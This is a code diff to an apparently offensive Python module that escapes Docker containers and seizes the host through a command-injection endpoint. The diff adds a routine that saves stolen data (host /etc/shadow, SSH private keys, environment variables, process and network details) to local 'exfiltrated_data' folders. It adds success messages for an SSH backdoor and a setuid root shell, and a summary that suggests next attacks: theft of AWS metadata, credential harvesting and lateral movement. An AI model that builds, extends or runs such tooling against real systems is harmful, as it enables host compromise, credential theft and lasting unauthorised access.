@@ -5,6 +5,9 @@ Docker 컨테이너 탈출 및 호스트 시스템 권한 획득 모듈
 
 import time
 import re
+import os
+import json
+from datetime import datetime
 from utils.logger import log_attack, log_command_output, log_exfiltrated_data
 
 # Docker 탈출 벡터 확인
@@ -307,6 +310,9 @@ def scan_escape_vectors(session, cmdi_url, results, delay):
                         'output': output
                     })
 
+                    # 데이터를 파일로 저장
+                    saved_file = save_exfiltrated_data(category, cmd, output, results)
+
                     log_command_output(cmd, category, output, preview_lines=20)
                     log_attack(
                         'DOCKER_ESCAPE_VECTOR',
@@ -327,6 +333,7 @@ def scan_escape_vectors(session, cmdi_url, results, delay):
                         print(f"      [!] 호스트 파일시스템 마운트됨!")
                     else:
                         print(f"      [+] {cmd[:60]}")
+                    print(f"      [📁] 저장됨: {saved_file}")
 
                 time.sleep(delay)
 
@@ -377,6 +384,9 @@ def attempt_container_escape(session, cmdi_url, results, delay):
                         'output': output
                     })
 
+                    # 데이터를 파일로 저장
+                    saved_file = save_exfiltrated_data(technique['name'], exploit_cmd, output, results)
+
                     # 호스트 데이터 탈취 로그 기록
                     log_exfiltrated_data(
                         f"Docker Escape - {technique['name']}",
@@ -396,17 +406,67 @@ def attempt_container_escape(session, cmdi_url, results, delay):
                     # 민감한 데이터 발견 시 표시
                     if 'root:' in output or '$6$' in output:
                         print(f"        [!!!] 호스트 /etc/shadow 접근 성공! ({len(output)} bytes)")
+                        print(f"        [📁] 저장됨: {saved_file}")
                         results['findings']['escaped'] = True
                     elif 'BEGIN RSA PRIVATE KEY' in output or 'BEGIN OPENSSH PRIVATE KEY' in output:
                         print(f"        [!!!] SSH 프라이빗 키 탈취 성공!")
+                        print(f"        [📁] 저장됨: {saved_file}")
                         results['findings']['escaped'] = True
                     elif len(output) > 50:
                         print(f"        [+] 데이터 수집: {len(output)} bytes")
+                        print(f"        [📁] 저장됨: {saved_file}")
 
                 time.sleep(delay)
 
         except Exception as e:
             log_attack('DOCKER_ESCAPE_ATTEMPT', 'ERROR', f"Technique: {technique['name']}, Error: {str(e)}", 0, 0)
+
+def save_exfiltrated_data(technique_name, command, output, results):
+    """탈취한 데이터를 파일로 저장"""
+    # 저장 디렉토리 생성
+    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+    base_dir = f"exfiltrated_data/docker_escape_{timestamp}"
+    os.makedirs(base_dir, exist_ok=True)
+
+    # 파일명 생성 (특수문자 제거)
+    safe_technique = re.sub(r'[^\w\s-]', '', technique_name).strip()
+    safe_technique = re.sub(r'[-\s]+', '_', safe_technique)
+
+    # 명령어에 따른 파일명 결정
+    if 'shadow' in command:
+        filename = f"{safe_technique}_etc_shadow.txt"
+    elif 'id_rsa' in command:
+        filename = f"{safe_technique}_ssh_keys.txt"
+    elif 'environ' in command:
+        filename = f"{safe_technique}_environment_vars.txt"
+    elif 'uname' in command or 'version' in command:
+        filename = f"{safe_technique}_kernel_info.txt"
+    elif 'mount' in command:
+        filename = f"{safe_technique}_mount_info.txt"
+    elif 'cgroup' in command:
+        filename = f"{safe_technique}_cgroup_info.txt"
+    elif 'ps' in command:
+        filename = f"{safe_technique}_processes.txt"
+    elif 'ip' in command or 'ifconfig' in command:
+        filename = f"{safe_technique}_network_info.txt"
+    else:
+        filename = f"{safe_technique}_output_{len(os.listdir(base_dir))}.txt"
+
+    # 데이터 저장
+    filepath = os.path.join(base_dir, filename)
+    with open(filepath, 'w', encoding='utf-8') as f:
+        f.write(f"Technique: {technique_name}\n")
+        f.write(f"Command: {command}\n")
+        f.write(f"Timestamp: {datetime.now()}\n")
+        f.write(f"{'='*80}\n\n")
+        f.write(output)
+
+    # 결과에 저장된 파일 경로 추가
+    if 'saved_files' not in results:
+        results['saved_files'] = []
+    results['saved_files'].append(filepath)
+
+    return filepath
 
 def extract_command_output(html_response):
     """HTML 응답에서 명령어 출력 추출"""
@@ -527,9 +587,13 @@ def attempt_host_root_access(session, cmdi_url, results, delay):
                 if output and len(output) > 5:
                     results['successful'] += 1
 
+                    # 데이터를 파일로 저장
+                    saved_file = save_exfiltrated_data(f"Root Access - {attempt['name']}", cmd, output, results)
+
                     # 루트 권한 획득 성공 확인
                     if 'root' in output or 'uid=0' in output:
                         print(f"        [!!!] 루트 권한 획득 성공!")
+                        print(f"        [📁] 저장됨: {saved_file}")
                         results['findings']['root_access'] = True
                         log_exfiltrated_data(
                             'ROOT_ACCESS',
@@ -539,10 +603,13 @@ def attempt_host_root_access(session, cmdi_url, results, delay):
                         )
                     elif 'authorized_keys' in cmd and 'ssh-rsa' in output:
                         print(f"        [!!!] SSH 백도어 설치 성공!")
+                        print(f"        [📁] 저장됨: {saved_file}")
                     elif 'rootshell' in output and '4755' in output:
                         print(f"        [!!!] SetUID 루트쉘 생성 성공!")
+                        print(f"        [📁] 저장됨: {saved_file}")
                     else:
                         print(f"        [+] 명령 실행: {len(output)} bytes")
+                        print(f"        [📁] 저장됨: {saved_file}")
 
                     log_command_output(cmd, 'ROOT_ACCESS_ATTEMPT', output)
 
@@ -570,15 +637,40 @@ def print_docker_escape_summary(results):
             for vector, data in findings['escape_vectors'].items():
                 print(f"      - {vector}: {len(data)}개 발견")
 
-        if findings['escaped']:
-            print(f"\n  [!!!] 컨테이너 탈출: 성공! (호스트 접근 획득)")
-            print(f"  [!!!] 호스트 시스템 데이터 탈취 성공!")
+        if findings['escaped'] or findings['host_access']:
+            print(f"\n  {'='*60}")
+            print(f"  [🔥🔥🔥] 탈출 성공! 호스트 시스템 접근 획득!")
+            print(f"  {'='*60}")
 
             if findings.get('root_access'):
-                print(f"\n  [!!!] 호스트 루트 권한: 획득 성공!")
-                print(f"  [!!!] 시스템 완전 장악!")
-        elif findings['host_access']:
-            print(f"\n  [+] 호스트 시스템 접근: {len(findings['host_access'])}개 방법 발견")
+                print(f"\n  [💀💀💀] 호스트 루트 권한 획득!")
+                print(f"  [💀💀💀] 시스템 완전 장악 성공!")
+                print(f"\n  🎯 공격자가 할 수 있는 것:")
+                print(f"     ✓ 모든 시스템 파일 읽기/쓰기")
+                print(f"     ✓ 새로운 백도어 계정 생성")
+                print(f"     ✓ SSH 키 설치로 영구 접근")
+                print(f"     ✓ 시스템 로그 삭제 및 조작")
+                print(f"     ✓ 다른 컨테이너 조작")
+                print(f"     ✓ 호스트 네트워크 스니핑")
+            else:
+                print(f"\n  [🔓] 호스트 접근 성공! (제한된 권한)")
+                print(f"  [⚠️] 루트 권한 획득 시도 중...")
+
+            if 'saved_files' in results:
+                print(f"\n  📁 수집된 데이터 저장 위치:")
+                # 디렉토리만 표시
+                dirs = set(os.path.dirname(f) for f in results['saved_files'])
+                for d in dirs:
+                    print(f"     {d}/")
+                    file_count = len([f for f in results['saved_files'] if os.path.dirname(f) == d])
+                    print(f"     └─ {file_count}개 파일 저장됨")
+
+            print(f"\n  [💡] 추가 공격 제안:")
+            print(f"     1. AWS 메타데이터 탈취: cloud-exploit")
+            print(f"     2. OpenSearch/Kibana 접근: 수집된 설정 파일 확인")
+            print(f"     3. 다른 서비스 크리덴셜 수집: 환경변수 및 설정 파일 분석")
+            print(f"     4. 횡적 이동: 네트워크 정보로 다른 시스템 탐색")
+
         else:
             print(f"\n  [-] 컨테이너 탈출: 실패")
     else:
